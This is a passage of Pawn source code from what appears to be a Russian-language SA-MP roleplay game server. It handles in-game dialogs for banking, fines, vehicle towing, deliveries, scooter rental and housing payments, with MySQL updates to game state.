							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE bank_accounts SET balance=balance+%d WHERE id=%d", sum, to_account);
							mysql_query(dbHandle, STRING_GLOBAL);

							g_bank_accounts[playerid][accountid][B_BALANCE] -= sum;

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE bank_accounts SET balance=%d WHERE id=%d", g_bank_accounts[playerid][accountid][B_BALANCE], g_bank_accounts[playerid][accountid][B_ID]);
							mysql_query(dbHandle, STRING_GLOBAL);

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Ваш перевод на счет №%d в размере %d рублей был успешно отправлен", to_account, sum);
							SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

							new reason[64];
							format(reason, sizeof reason, "+ Пополнение от %s на сумму %d рублей", GetName(playerid), sum);
							SendBankAccountLog(playerid, to_account, reason);
						}
						else SendClientMessage(playerid, C_RED, "У Вас недостаточно денег");
						cache_delete(result);
					}
					else
					{
						SendClientMessage(playerid, C_RED, "Вы допустили ошибку в номере счета.");
						cache_delete(result);
					}
				}
			}
			else SendClientMessage(playerid, C_RED, "Вы ввели некорректную сумму");
		}
	}

	case DIALOG_BANK_CREATE_ACCOUNT:
	{
		if(response)
		{
			new len = strlen(inputtext);

			if(3 <= len <= 20)
			{
				if(!IsABadBankAccountName(inputtext))
				{
					new Cache: result;
					new total_accounts;

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT COUNT(*) FROM bank_accounts WHERE owner_id=%d", PI[playerid][pID]);
					result = mysql_query(dbHandle, STRING_GLOBAL);

					total_accounts = cache_get_row_int(0, 0);
					cache_delete(result);

					if(total_accounts < MAX_BANK_ACCOUNTS)
					{
						STRING_GLOBAL[0] = EOS;
						mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO bank_accounts (owner_id,name,reg_time) VALUES (%d,'%e',%d)", PI[playerid][pID], inputtext, gettime());
						mysql_query(dbHandle, STRING_GLOBAL, false);

						ShowPlayerDialog
						(
							playerid, 0, DIALOG_STYLE_MSGBOX,
							"{FFCC00}Счет создан",
							"{FFFFFF}Вы создали новый счет в банке.\n\n"\
							"Для доступа к нему используйте PIN-код {00FF66}0000{FFFFFF}. После входа\n"\
							"настоятельно рекомендуем изменить его на более сложный.\n"\
							"Это поможет защитить счет от несанкционированного доступа.",
							"Закрыть", ""
						);
					}
					else SendClientMessage(playerid, C_RED, "Вы достигли максимальное количество счетов (8)");
				}
				else
				{
					SendClientMessage(playerid, C_RED, "Вы ввели неверное название счета.");
					SendClientMessage(playerid, C_RED, "Можно использовать русские и английские цифры, а также цифры");
				}
			}
			else
			{
				SendClientMessage(playerid, C_RED, "Вы ввели неверное название счета.");
				SendClientMessage(playerid, C_RED, "Можно использовать русские и английские цифры, а также цифры");
				return ShowPlayerBankAccountCreate(playerid);
			}
		}
	}

	case DIALOG_BANK_MAIN:
	{
		if(response)
		{
			switch(listitem)
			{
				case 0..1:
				{
					ShowPlayerBankSelectDialog(playerid, !listitem);
				}
				case 2:
				{
					STRING_GLOBAL[0] = EOS;

					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{ffffff}На Вашем основном банковском счету {ffcc00}%d рублей", PI[playerid][pBank]);

					ShowPlayerDialog
					(
						playerid, 0, DIALOG_STYLE_MSGBOX,
						"{ffcc00}Баланс",
						STRING_GLOBAL,
						"Закрыть", ""
					);
				}
				case 3..4:
				{
					if(GetPlayerBizz(playerid) > 0)
					{
						ShowPlayerBankCompanyDialog(playerid, listitem == 3 ? true : false);
					}
					else SendClientMessage(playerid, C_RED, "У Вас нет предприятия");
				}
				case 5:
				{
					if(response)
					{
					    if(PI[playerid][pPhoneNumber] <= 1)
						{
							SendClientMessage(playerid, COLOR_GREY, "У Вас нет Sim-Card!");
							return 1;
						}
						ShowPlayerDialog
						(
							playerid, DIALOG_BANK_PHONE_BALANCE, DIALOG_STYLE_INPUT,
							"{ffcc00}Пополнение мобильного счета",
							"{ffffff}Введите сумму, которую хотите пополнить:",
							"Пополнить", "Отмена"
						);
					}
				}
				case 6:
				{
					if(response)
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_BANK_TRANSFER, DIALOG_STYLE_INPUT,
							"{FFCC00}Безналичный перевод",
							"{ffffff}Введите ник игрока и количество денег для перевода через запятую:\n(Пример: Ivan_Ivanov,100000)",
							"Перевести", "Отмена"
						);
					}
				}
				case 7:
				{
					if(GetPlayerHouse(playerid) > 0)
					{
						new h = GetPVarInt(playerid, "PlayerHouse");
						return ShowPlayerDialogPayHouse(playerid, h);
					}

					return SendClientMessage(playerid, COLOR_GREY, "У Вас нет дома/квартиры");
				}
				case 8:
				{
					if(GetPlayerBizz(playerid) > 0)
					{
						new b = GetPVarInt(playerid, "PlayerBizz");
						return ShowPlayerDialogPayBusiness(playerid, b);
					}

					return SendClientMessage(playerid, COLOR_GREY, "У Вас нет бизнеса");
				}
				case 9:
				{
					if(!GetPlayerFines(playerid))
						return SendClientMessage(playerid, C_RED, "У Вас нет неоплаченных штрафов");

					ShowPlayerDialog
					(
						playerid, DIALOG_PAY_FINES, DIALOG_STYLE_INPUT,
						"{FFCC00}Оплата штрафа",
						"{FFFFFF}Введите номер штрафа, который Вы хотите оплатить:",
						"Оплатить", "Отмена"
					);
				}
				case 10:
				{
					if(!GetPlayerFines(playerid))
						return SendClientMessage(playerid, C_RED, "У Вас нет неоплаченных штрафов");

					new rows, Cache: result;

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM fines WHERE owner_id=%d", PI[playerid][pID]);
					result = mysql_query(dbHandle, STRING_GLOBAL);

					rows = cache_num_rows();

					new amount = 0;

					for(new idx; idx < rows; idx ++)
					{
						amount += cache_get_field_content_int(idx, "amount");
					}

					STRING_GLOBAL[0] = EOS;
					format
					(
						STRING_GLOBAL, sizeof STRING_GLOBAL,
						"{FFFFFF}Сумма всех Ваших штрафов составляет {FFCC00}%d рублей\n"\
						"{FFFFFF}Вы действительно хотите оплатить все Ваши штрафы?",
						amount
					);

					ShowPlayerDialog
					(
						playerid, DIALOG_PAY_FINES_ALL, DIALOG_STYLE_MSGBOX,
						"{FFCC00}Оплата всех штрафов",
						STRING_GLOBAL,
						"Оплатить", "Отмена"
					);

					g_player_listitem[playerid][0] = amount;

					cache_delete(result);

				}
			}
		}
	}

	case DIALOG_PAY_FINES_ALL:
	{
		if(response)
		{
			new amount = g_player_listitem[playerid][0];

			if(amount > 0)
			{
				if(GetMoney(playerid) < amount)
					return SendMess(playerid, MSG_NOT_MONEY);

				GiveMoney(playerid, -amount);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "DELETE FROM fines WHERE owner_id=%d", PI[playerid][pID]);
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно оплатили все штрафы за %d рублей.", amount);
				SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
			}
		}
	}

	case DIALOG_TOW_CAR:
	{
		if(response)
		{
			if(IsACop(playerid))
			{
				new vehicleid = GetPlayerVehicleID(playerid);

				if(GetVehicleModel(vehicleid) == 525)
				{
					if(IsTrailerAttachedToVehicle(vehicleid))
					{
						SendClientMessage(playerid, C_OSNOV, "Вы доставили транспорт на штрафстоянку. Вам была выписана премия в размере 50000 рублей");

						GiveMoney(playerid, 50000);

						new owner_vehicle = GetVehicleTrailer(vehicleid),
							to_player = GetVehicleData(owner_vehicle, veh_owner_id);

						DetachTrailerFromVehicle(vehicleid);

						g_vehicle[owner_vehicle][veh_virtual] = 10000;

						g_vehicle[owner_vehicle][veh_milliage] = GetVehicleData(owner_vehicle, veh_milliage);
						g_vehicle[owner_vehicle][veh_fuel] = GetVehicleData(owner_vehicle, veh_fuel);

						new Float:health;
						GetVehicleHealth(owner_vehicle, health);

						if(health < 300.0) health = 300.0;

						g_vehicle[owner_vehicle][veh_health] = health;

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ownable_cars SET fuel=%d, mileage='%f', health='%f', virtual=10000 WHERE id=%d", g_vehicle[owner_vehicle][veh_fuel], g_vehicle[owner_vehicle][veh_milliage], g_vehicle[owner_vehicle][veh_health], g_vehicle[owner_vehicle][veh_sql_id]);
						mysql_query(dbHandle, STRING_GLOBAL);

						if(IsValidDynamic3DTextLabel(g_vehicle[owner_vehicle][veh_number_label]))
							DestroyDynamic3DTextLabel(g_vehicle[owner_vehicle][veh_number_label]);

						if(IsValidDynamic3DTextLabel(g_vehicle[owner_vehicle][veh_label]))
							DestroyDynamic3DTextLabel(g_vehicle[owner_vehicle][veh_label]);

						PI[to_player][P_OWNABLE_CAR][GetVehicleData(owner_vehicle, veh_slot)-1] = INVALID_VEHICLE_ID;

						ClearVehicleData(owner_vehicle);

						DestroyVehicle(owner_vehicle);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Сотрудник полиции %s[%d] забрал Ваш транспорт на штрафстоянку. Причина: %s", GetName(playerid), playerid, inputtext);
						SendClientMessage(to_player, C_BLUE, STRING_GLOBAL);

						WritePlayerFine(to_player, 100000, inputtext);

						SetVehicleData(owner_vehicle, veh_owner_id, INVALID_PLAYER_ID);
					}
				}
			}
		}
	}

	case DIALOG_PARKING_FINE:
	{
		if(response)
		{
			if(GetPlayerFines(playerid))
				return SendClientMessage(playerid, C_RED, "Для получения транспорта оплатите все штрафы. (/gps > 5)");

			new index = g_player_listitem[playerid][listitem];

			new r = random(sizeof SalonRandSpawn);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ownable_cars SET pos_x='%f', pos_y='%f', pos_z='%f', pos_r='%f', virtual=0 WHERE id=%d", SalonRandSpawn[r][0], SalonRandSpawn[r][1], SalonRandSpawn[r][2], SalonRandSpawn[r][3], index);
			mysql_query(dbHandle, STRING_GLOBAL);

			SendClientMessage(playerid, C_OSNOV, "Вы забрали свой транспорт с штрафстоянки. Теперь он припаркован у Анашана.");

			LoadPlayerOwnableCar(playerid, index);
		}
	}

	case DIALOG_FIND_CAR:
	{
		if(response)
		{
			new id = g_player_listitem[playerid][listitem],
				rows,
				Cache: result,
				slot;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM ownable_cars WHERE id=%d", id);
			result = mysql_query(dbHandle, STRING_GLOBAL);

			rows = cache_num_rows();

			if(rows)
			{
				slot = cache_get_field_content_int(0, "slot");
			}

			slot --;

			new vehicleid = PI[playerid][P_OWNABLE_CAR][slot];

			if(!IsValidVehicle(PI[playerid][P_OWNABLE_CAR][slot]))
				return SendMess(playerid, MSG_NO_PLAYER_CREATE_CAR);

			if(GetVehicleData(vehicleid, veh_virtual) > 1000) return SendClientMessage(playerid, COLOR_GREY, "Ваш транспорт припаркован в гараже");

			new Float: X, Float: Y, Float: Z;

			GetVehiclePos(PI[playerid][P_OWNABLE_CAR][slot], X, Y, Z);
			new locname[20] = "Личный автомобиль";
			GPSPlayer_(playerid, X, Y, Z, locname);

			cache_delete(result);
		}
	}

	case DIALOG_ORDERS:
	{
		if(response)
		{
			new bool: car;

			for(new i; i < MAX_PLAYER_OWNABLE_CARS; i ++)
			{
				if(!IsValidVehicle(PI[playerid][P_OWNABLE_CAR][i]))
					continue;

				if(GetVehicleData(PI[playerid][P_OWNABLE_CAR][i], veh_slot) == 55)
				{
					car = true;
					break;
				}
			}

			if(car == false)
				return SendClientMessage(playerid, C_RED, "У Вас нет грузовика");

			if(0 <= listitem <= 9)
			{
				new index = g_player_listitem[playerid][listitem];

				new Cache: result, rows;
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM orders WHERE id=%d AND status=0", index);
				result = mysql_query(dbHandle, STRING_GLOBAL);

				rows = cache_num_rows();

				if(!rows)
					return SendClientMessage(playerid, C_RED, "Этот заказ уже в пути"), cache_delete(result);

				new product = cache_get_field_content_int(0, "amount");

				if(PI[playerid][P_LOAD_JOB] < product)
					return SendClientMessage(playerid, C_RED, "У Вас недостаточно продуктов"), cache_delete(result);

				PI[playerid][P_ORDER_ID] = index;

				new businessid = cache_get_field_content_int(0, "business");

				GPSPlayer_(playerid, BizzInfo[businessid][bEntrx],  BizzInfo[businessid][bEntry],  BizzInfo[businessid][bEntrz], "Доставка продуктов");

				SendClientMessage(playerid, C_OSNOV, "Доставьте продукты к бизнесу, отмеченному на карте");
				SendClientMessage(playerid, C_OSNOV, "Если Вы не доставите заказ в течении 10 минут то он будет передан другому игроку");

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE orders SET status=1, contractor=%d WHERE id=%d", PI[playerid][pID], index);
				mysql_query(dbHandle, STRING_GLOBAL);

				PI[playerid][P_ORDER_BIZ_ID] = GetPVarInt(playerid, "PlayerBizz");
				PI[playerid][P_ORDER_TIME] = gettime() + 60*10;

				if(BizzInfo[PI[playerid][P_ORDER_BIZ_ID]][bProduct] > 0)
				{
					BizzInfo[PI[playerid][P_ORDER_BIZ_ID]][bProduct] -= 100;
					MysqlUpdateBizzInt(PI[playerid][P_ORDER_BIZ_ID], "money", BizzInfo[PI[playerid][P_ORDER_BIZ_ID]][bMoney]);
					MysqlUpdateBizzInt(PI[playerid][P_ORDER_BIZ_ID], "product", BizzInfo[PI[playerid][P_ORDER_BIZ_ID]][bProduct]);
				}

				cache_delete(result);
			}
			else if(listitem == 10)
			{
				ShowPlayerOrdersList(playerid, g_player_listitem_use[playerid]);
			}
		}
	}

	case DIALOG_LOAD_PROD:
	{
		if(response)
		{
			if(!IsPlayerInAnyVehicle(playerid))
				return SendClientMessage(playerid, C_RED, "Вы должны находиться в транспорте");

			new product = strval(inputtext);

			if(product > 0 && IsNumeric(inputtext))
			{
				if(GetMoney(playerid) < product*10)
					return SendMess(playerid, MSG_NOT_MONEY);

				new vehicleid = GetPlayerVehicleID(playerid);

				new max_products;

				for(new i; i < sizeof g_max_products; i ++)
				{
					if(GetVehicleModel(vehicleid) == g_max_products[i][0])
					{
						max_products = g_max_products[i][1];
						break;
					}
				}

				if(PI[playerid][P_LOAD_JOB] + product > max_products)
					return SendClientMessage(playerid, C_RED, "В Ваш грузовик не может поместиться столько продуктов");

				GiveMoney(playerid, -product*10);

				SendClientMessage(playerid, C_OSNOV, "Вы успешно загрузили продукты в свой грузовик, теперь найдите заказ с помощью транспортной компании");

				if(514 <= GetVehicleModel(vehicleid) <= 515 && PI[playerid][P_LOAD_JOB] == 0)
				{
					new r = random(sizeof coord_spawn_trailers);

					PI[playerid][P_GRUZ_CAR] = CreateVehicle(435, coord_spawn_trailers[r][0], coord_spawn_trailers[r][1], coord_spawn_trailers[r][2], coord_spawn_trailers[r][3], -1, -1, -1);

					GPSPlayer_(playerid, coord_spawn_trailers[r][0], coord_spawn_trailers[r][1], coord_spawn_trailers[r][2], "Трейлер");

					SendClientMessage(playerid, C_OSNOV, "Не забудьте забрать прицеп, он отмечен на GPS");
				}

				PI[playerid][P_LOAD_JOB] += product;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ownable_cars SET products=%d WHERE id=%d", PI[playerid][P_LOAD_JOB], GetVehicleData(vehicleid, veh_sql_id));
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Доставка продуктов\n{FFFFFF}Загружено %d / %d шт.", PI[playerid][P_LOAD_JOB], max_products);
				UpdateDynamic3DTextLabelText(g_vehicle[vehicleid][veh_label], 0xFF6600FF, STRING_GLOBAL);
			}
		}
	}
	case DIALOG_AREND_SCOOTER:
	{
		if(response)
		{
			if(PI[playerid][P_AREND_SCOOTER] != INVALID_VEHICLE_ID)
				return SendClientMessage(playerid, C_WHITE, "Вы уже взяли скутер в аренду.");
			if(PI[playerid][pCash] < 50) return SendClientMessage(playerid, C_WHITE, "У вас недостаточно денег для аренды.");
			// develop.
			if(IsPlayerInRangeOfPoint(playerid, 3.0, 1899.1311,2073.4895,15.9169))
			{
				new r = random(sizeof coord_spawn_scooters_bat);

				PI[playerid][P_AREND_SCOOTER] = CreateVehicle(462, coord_spawn_scooters_bat[r][0], coord_spawn_scooters_bat[r][1], coord_spawn_scooters_bat[r][2], coord_spawn_scooters_bat[r][3], -1, -1, -1);

				SetVehicleVirtualWorld(PI[playerid][P_AREND_SCOOTER], GetPlayerVirtualWorld(playerid));
				LinkVehicleToInterior(PI[playerid][P_AREND_SCOOTER], GetPlayerInterior(playerid));

				ClearVehicleData(PI[playerid][P_AREND_SCOOTER]);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 2515.4492,-2132.8435,21.9700))
			{
				new r = random(sizeof coord_spawn_scooters_yujz);

				PI[playerid][P_AREND_SCOOTER] = CreateVehicle(462, coord_spawn_scooters_yujz[r][0], coord_spawn_scooters_yujz[r][1], coord_spawn_scooters_yujz[r][2], coord_spawn_scooters_yujz[r][3], -1, -1, -1);

				SetVehicleVirtualWorld(PI[playerid][P_AREND_SCOOTER], GetPlayerVirtualWorld(playerid));
				LinkVehicleToInterior(PI[playerid][P_AREND_SCOOTER], GetPlayerInterior(playerid));

				ClearVehicleData(PI[playerid][P_AREND_SCOOTER]);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 789.9755,520.3755,12.0084))
			{
				new r = random(sizeof coord_spawn_scooters_sounth);

				PI[playerid][P_AREND_SCOOTER] = CreateVehicle(462, coord_spawn_scooters_sounth[r][0], coord_spawn_scooters_sounth[r][1], coord_spawn_scooters_sounth[r][2], coord_spawn_scooters_sounth[r][3], -1, -1, -1);

				SetVehicleVirtualWorld(PI[playerid][P_AREND_SCOOTER], GetPlayerVirtualWorld(playerid));
				LinkVehicleToInterior(PI[playerid][P_AREND_SCOOTER], GetPlayerInterior(playerid));

				ClearVehicleData(PI[playerid][P_AREND_SCOOTER]);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 2317.6768,1729.5619,1.8702))
			{
				new r = random(sizeof coord_spawn_scooters_miner);

				PI[playerid][P_AREND_SCOOTER] = CreateVehicle(462, coord_spawn_scooters_miner[r][0], coord_spawn_scooters_miner[r][1], coord_spawn_scooters_miner[r][2], coord_spawn_scooters_miner[r][3], -1, -1, -1);

				SetVehicleVirtualWorld(PI[playerid][P_AREND_SCOOTER], GetPlayerVirtualWorld(playerid));
				LinkVehicleToInterior(PI[playerid][P_AREND_SCOOTER], GetPlayerInterior(playerid));

				ClearVehicleData(PI[playerid][P_AREND_SCOOTER]);
			}
			else
			{
				new r = random(sizeof coord_spawn_scooters);
				PI[playerid][P_AREND_SCOOTER] = CreateVehicle(462, coord_spawn_scooters[r][0], coord_spawn_scooters[r][1], coord_spawn_scooters[r][2], coord_spawn_scooters[r][3], -1, -1, -1);
			}

			PutPlayerInVehicle(playerid, PI[playerid][P_AREND_SCOOTER], 0);

			new vehicleid = PI[playerid][P_AREND_SCOOTER];

			SetVehicleData(vehicleid, veh_owner_id, playerid);
			SetVehicleData(vehicleid, veh_fuel, 45);
			GiveMoney(playerid, -50, "Аренда скутера");
            SendClientMessage(playerid, C_WHITE, "{ebc016}Арендатор: {FFFFFF}Удачной дороги, смотри акуратнее там! {ebc016}(отказаться от аренды /unrent)");
		}
	}

	case DIALOG_DELIVERY_BOTTLE:
	{
	    if(response)
	    {
	        if(PI[playerid][pLevel] > 3)
 				return SendClientMessage(playerid, C_RED, "Сдача бутылок доступна до 3 уровня");

			if(PI[playerid][pBottles] == 0)
				return SendClientMessage(playerid, C_RED, "У Вас нет бутылок");

			bottlemoney = PI[playerid][pBottles] * 30;
   			GiveMoney(playerid, bottlemoney);

		    PI[playerid][pBottles] = 0;

			STRING_GLOBAL[0] = EOS;
      		format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"{80FFFF}Вы получили: {FFFFFF}%d вирт", bottlemoney);
    		SendClientMessage(playerid,COLOR_GREEN,STRING_GLOBAL);
			SavePlayerBottles(playerid);
	    }
	}

	case DIALOG_PAY_HOUSE:
	{
		if(response)
		{
			new pay_days, fmt_msg[128];

			new h = GetPVarInt(playerid, "PlayerHouse");
			if(sscanf(inputtext, "i", pay_days))
			{
				ShowPlayerDialogPayHouse(playerid, h);
			}
			if(pay_days > 0 && isNumeric(inputtext))
			{
				if((pay_days + HouseInfo[h][hOplata]) > 10)
					return SendMess(playerid, MSG_PAY_HOUSE_DAYS);

				if(GetMoney(playerid) < (pay_days * GetHomeOplata(h)))
				{
					SendMess(playerid, MSG_NOT_MONEY);

					format(fmt_msg, sizeof fmt_msg, "Для оплаты проживания на %d дней необходимо %d руб", pay_days, pay_days * GetHomeOplata(h));
					return SendClientMessage(playerid, 0x999999FF, fmt_msg);
				}
				else
				{
					HouseInfo[h][hOplata] += pay_days;
					MysqlUpdateHouseInt(h, "hOplata", HouseInfo[h][hOplata]);

					GiveMoney(playerid, -pay_days * GetHomeOplata(h));

					format(fmt_msg, sizeof fmt_msg, "Вы успешно оплатили проживание в доме ещё на {00CCFF}%d дней", pay_days);
					return SendClientMessage(playerid, 0x99FF00FF, fmt_msg);
				}
			}
		}
	}

	case DIALOG_PAY_BUSINESS:
	{
		if(response)
		{
			new pay_days, fmt_msg[128];

			new b = GetPVarInt(playerid, "PlayerBizz");
			if(sscanf(inputtext, "i", pay_days))
			{
				ShowPlayerDialogPayBusiness(playerid, b);
			}
			if(pay_days > 0 && isNumeric(inputtext))
			{
				if((pay_days + BizzInfo[b][bOplata]) > 30)
					return SendMess(playerid, MSG_PAY_BIZZ_DAYS);

				if(GetMoney(playerid) < (pay_days * GetBizOplata(b)))
				{
					SendMess(playerid, MSG_NOT_MONEY);

					format(fmt_msg, sizeof fmt_msg, "Для оплаты бизнеса на %d дней необходимо %d руб", pay_days, pay_days * GetBizOplata(b));
					return SendClientMessage(playerid, 0x999999FF, fmt_msg);
				}
				else
				{
					BizzInfo[b][bOplata] += pay_days;
					MysqlUpdateBizzInt(b, "oplata", BizzInfo[b][bOplata]);

					GiveMoney(playerid, -pay_days * GetBizOplata(b));

					format(fmt_msg, sizeof fmt_msg, "Вы успешно оплатили бизнес ещё на {00CCFF}%d дней", pay_days);
					return SendClientMessage(playerid, 0x99FF00FF, fmt_msg);
				}
			}
		}
	}

	case DIALOG_ENTRACE_MENU:
	{
		if(response)
		{
			new entranceid = PI[playerid][P_IN_ENTRANCE];

			if(entranceid == -1)
				return 1;

			switch(listitem)
			{
				case 0:
				{
					ShowPlayerFreeRomm(playerid, entranceid);
				}
				case 1:
				{
					new roomid = GetFreeEntranceRoom(entranceid);

					if(roomid != -1)
					{
						g_player_listitem_use[playerid] = roomid;

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{FFFFFF}Вы действительно хотите заселиться в квартире %d за {FFCC00}%d рублей?", (roomid % 22) + 1, GetEntranceData(entranceid, E_PRICE_ROOM));

						ShowPlayerDialog
						(
							playerid, DIALOG_ENTRACE_REG, DIALOG_STYLE_MSGBOX,
							"{FFCC00}Регистрация",
							STRING_GLOBAL,
							"Да", "Нет"
						);
					}
					else
					{
						ShowPlayerDialog
						(
							playerid, 0, DIALOG_STYLE_MSGBOX,
							"{FFCC00}Регистрация",
							"К сожалению в этом подъезде нет свободных квартир",
							"Закрыть", ""
						);
					}
				}
				case 2:
				{
					if(entranceid != PI[playerid][P_ENTRANCE])
						return SendClientMessage(playerid, C_RED, "Вы должны находиться в своем подъезде");

					ShowPlayerDialog
					(
						playerid, DIALOG_MENU_LODGER, DIALOG_STYLE_LIST,
						"{FFCC00}Меню жильца",
						"1. Оплатить проживание\n"\
						"2. Выселиться из квартиры",
						"Далее", "Отмена"
					);
				}
			}
		}
	}

	case DIALOG_ENTRACE_REG:
	{
		if(response)
		{
			new entranceid = PI[playerid][P_IN_ENTRANCE];

			if(entranceid == -1)
				return 1;

			if(GetMoney(playerid) < GetEntranceData(entranceid, E_PRICE_ROOM))
				return SendMess(playerid, MSG_NOT_MONEY);

			if(GetPlayerHouse(playerid) > 0 || PI[playerid][P_ENTRANCE] != -1 || PI[playerid][P_ROOM] != -1)
				return SendClientMessage(playerid, C_RED, "У Вас уже есть жильё");

			new roomid = g_player_listitem_use[playerid];

			if(strcmp(GetRoomData(entranceid, roomid, ER_OWNER), "None", true))
				return SendClientMessage(playerid, C_RED, "У этой квартиры уже есть арендатор");

			PI[playerid][P_ENTRANCE] = entranceid;
			PI[playerid][P_ROOM] = roomid;

			g_rooms[entranceid][roomid][ER_PAY] = 1;
			g_rooms[entranceid][roomid][ER_OWNER] = EOS;
			strcat(g_rooms[entranceid][roomid][ER_OWNER], GetName(playerid));

			SetRoomData(entranceid, roomid, ER_OWNER, GetName(playerid));

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts a, rooms r SET a.entrance=%d, a.room=%d, r.owner='%s', r.pay=1 WHERE a.id=%d AND r.id=%d", PI[playerid][P_ENTRANCE], PI[playerid][P_ROOM], GetRoomData(entranceid, roomid, ER_OWNER), PI[playerid][pID], GetRoomData(entranceid, roomid, ER_SQL_ID));
			mysql_query(dbHandle, STRING_GLOBAL);
			printf("%s", STRING_GLOBAL);

			printf("owner: %s", GetRoomData(entranceid, roomid, ER_OWNER));

			SendClientMessage(playerid, C_BLUE, "Вы успешно арендовали квартиру");
			SendClientMessage(playerid, C_BLUE, "Открывать/закрывать квартиру можно с помощью команды /rlock");

			SetPlayerPosInRoom(playerid, entranceid, roomid);
		}
	}
	case DIALOG_ROOM_ENTER:
	{
		if(response)
		{
			new entranceid = PI[playerid][P_ENTRANCE],
				roomid = g_player_listitem_use[playerid];

			if(entranceid == -1 || roomid == -1)
				return 1;

			if(GetRoomData(entranceid, roomid, ER_LOCK) == false)
				return SendClientMessage(playerid, C_RED, "Эта квартира закрыта");

			SetPlayerPosInRoom(playerid, entranceid, roomid);
		}
	}
	case DIALOG_MENU_LODGER:
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					ShowPlayerDialogPayRoom(playerid, PI[playerid][P_ENTRANCE], PI[playerid][P_ROOM]);
				}
				case 1:
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_EVICTION_ROOM, DIALOG_STYLE_MSGBOX,
						"{FFCC00}Выселение из квартиры",
						"{FFFFFF}Вы действительно хотите выселиться из своей квартиры?",
						"Да", "Нет"
					);
				}
			}
		}
	}
	case DIALOG_PAY_ROOM:
	{
		if(response)
		{
			new entranceid = PI[playerid][P_ENTRANCE],
				roomid = PI[playerid][P_ROOM];

			if(entranceid == -1 || roomid == -1)
				return 1;

			if(entranceid != PI[playerid][P_IN_ENTRANCE])
				return SendClientMessage(playerid, C_RED, "Вы должны находиться в своем подъезде");

			new pay_days, fmt_msg[128];

			if(sscanf(inputtext, "i", pay_days))
			{
				ShowPlayerDialogPayRoom(playerid, PI[playerid][P_ENTRANCE], PI[playerid][P_ROOM]);
			}
			if(pay_days > 0 && isNumeric(inputtext))
			{
				if((pay_days + g_rooms[entranceid][roomid][ER_PAY]) > 30)
					return SendMess(playerid, MSG_PAY_BIZZ_DAYS);

				if(GetMoney(playerid) < (pay_days * g_entrance[entranceid][E_PRICE_ROOM]))
				{
					SendMess(playerid, MSG_NOT_MONEY);

					format(fmt_msg, sizeof fmt_msg, "Для оплаты квартиры на %d дней необходимо %d руб", pay_days, pay_days * g_entrance[entranceid][E_PRICE_ROOM]);
					return SendClientMessage(playerid, 0x999999FF, fmt_msg);
				}
				else
				{
					g_rooms[entranceid][roomid][ER_PAY] += pay_days;

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE rooms SET pay=%d WHERE id=%d", g_rooms[entranceid][roomid][ER_PAY], g_rooms[entranceid][roomid][ER_SQL_ID]);
					mysql_query(dbHandle, STRING_GLOBAL);

					GiveMoney(playerid, -pay_days * g_entrance[entranceid][E_PRICE_ROOM]);

					format(fmt_msg, sizeof fmt_msg, "Вы успешно оплатили квартиру ещё на {00CCFF}%d дней", pay_days);
					return SendClientMessage(playerid, 0x99FF00FF, fmt_msg);
				}
			}
		}
	}
	case DIALOG_EVICTION_ROOM:
	{
		if(response)
		{
			new entranceid = PI[playerid][P_ENTRANCE],
				roomid = PI[playerid][P_ROOM];

			if(entranceid == -1 || roomid == -1)
				return 1;

			SendClientMessage(playerid, C_BLUE, "Вы выселились из квартиры");

			g_rooms[entranceid][roomid][ER_OWNER] = EOS;
			strcat(g_rooms[entranceid][roomid][ER_OWNER], "None");

			PI[playerid][P_ENTRANCE] =
			PI[playerid][P_ROOM] = -1;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts a, rooms r SET a.entrance=%d, a.room=%d, r.owner='%s' WHERE a.id=%d AND r.id=%d", PI[playerid][P_ENTRANCE], PI[playerid][P_ROOM], GetRoomData(entranceid, roomid, ER_OWNER), PI[playerid][pID], GetRoomData(entranceid, roomid, ER_SQL_ID));
			mysql_query(dbHandle, STRING_GLOBAL);

			UpdateEntrance(entranceid);
		}
	}
	case DIALOG_COINS_LIST:
	{
		if(response)
		{
			if(!(0 <= listitem <= sizeof g_coins_list))
				return 1;

